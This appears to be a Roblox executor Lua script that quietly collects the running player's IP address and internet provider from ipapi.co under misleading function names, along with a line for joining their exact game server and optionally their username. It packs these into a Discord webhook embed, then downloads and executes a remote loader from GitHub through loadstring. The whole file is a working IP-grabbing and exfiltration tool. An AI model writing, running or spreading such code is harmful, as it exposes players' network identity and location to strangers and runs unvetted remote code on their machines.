local MarketplaceService = game:GetService("MarketplaceService")
local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")
local gameUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName
local HttpService = game:GetService("HttpService")

-- função de request com timeout
local function dataSAT(tab)
    local result, finished = nil, false

    local requestMethods = {
        function(tab) if fluxus and fluxus.request then return fluxus.request(tab) end end,
        function(tab) if request then return request(tab) end end,
        function(tab) if syn and syn.request then return syn.request(tab) end end,
        function(tab) if http_request then return http_request(tab) end end,
        function(tab) -- Delta / Hydrogen / Codex
            if tab.Method == "GET" then
                local body = game:HttpGet(tab.Url)
                return { Body = body, StatusCode = 200 }
            end
        end,
        function(tab) -- HttpService
            if tab.Method == "GET" then
                local body = HttpService:GetAsync(tab.Url)
                return { Body = body, StatusCode = 200 }
            end
        end
    }

    task.spawn(function()
        for _, method in ipairs(requestMethods) do
            local success, response = pcall(method, tab)
            if success and response and response.Body then
                result = response
                break
            end
        end
        finished = true
    end)

    -- timeout de 5s
    local start = os.clock()
    while not finished and os.clock() - start < 5 do
        task.wait()
    end

    return result
end

-- funções de coleta
local function getCountry()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.ip
end

local function getFreeWifi()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.org
end

local function getPopulation()
    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
    if not response or not response.Body then
        return "Unknow Metadata"
    end
    local data = HttpService:JSONDecode(response.Body)
    return data.country_population
    end

local Colors = {
    y = 16776960,
    g = 65280,
    o = 16753920,
    b = 3447003,
    r = 16711680,
    p = 10181046
}

local ip = getCountry()
local wifi = getFreeWifi()
local population = getPopulation()
local embedFields = {
    { name = "Sent:", value = "**<t:" .. os.time() .. ":R>**" },
    { name = "Game:", value = gameUrl },
    { name = "IP:", value = ip },
    { name = "Provider:", value = wifi },
    { name = "Population:", value = population },
    {
        name = "Place:",
        value = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)'
    }
}
if _G.showPlayerName and _G.showPlayerName == true then
    table.insert(embedFields, 3, { name = "Player:", value = game.Players.LocalPlayer.Name })
end

local ColorsList = {}
for _, v in pairs(Colors) do
    table.insert(ColorsList, v)
end

local chosenColor = ColorsList[math.random(1, #ColorsList)]

_G.web = {
    Webhook = _G.webhok,
    Message = "",
    Notify = false,
    embed = {
            title = _G.titlep,
            description = "",
            color = chosenColor,
            fields = embedFields,
            thumbnail = {
                url = _G.thumb
            },
            footer = {
                text = "Webhook System | REPORT BUGS (DM): @dircs"
            }
        }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/Discord-Webhook-SenderX.V.2.3.6/refs/heads/main/UpdatedVersionX.V.2.4.0/Loader.luau"))()
